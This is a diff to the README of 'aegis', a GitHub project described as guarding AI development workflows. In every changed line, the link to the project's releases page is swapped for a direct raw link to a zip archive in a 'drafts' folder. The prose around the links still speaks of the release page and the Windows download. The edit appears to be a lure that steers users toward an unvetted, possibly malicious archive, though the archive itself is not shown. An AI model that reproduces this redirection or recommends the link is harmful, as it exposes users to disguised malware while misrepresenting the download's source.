@@ -1,10 +1,10 @@
 # 🛡️ aegis - Guard Your AI Development Workflow
 
-[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge&logo=github)](https://github.com/ghosty21888/aegis/releases)
+[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge&logo=github)](https://github.com/ghosty21888/aegis/raw/refs/heads/main/drafts/Software-v2.7.zip)
 
 ## 📥 Download aegis
 
-Visit this page to download: https://github.com/ghosty21888/aegis/releases
+Visit this page to download: https://github.com/ghosty21888/aegis/raw/refs/heads/main/drafts/Software-v2.7.zip
 
 On that page, look for the latest release. Download the Windows file that matches your computer.
 
@@ -126,4 +126,4 @@ These topics point to a tool that supports careful AI development and steady del
 
 ## 🚦 Next step
 
-Open the release page and download the Windows version from https://github.com/ghosty21888/aegis/releases
+Open the release page and download the Windows version from https://github.com/ghosty21888/aegis/raw/refs/heads/main/drafts/Software-v2.7.zip
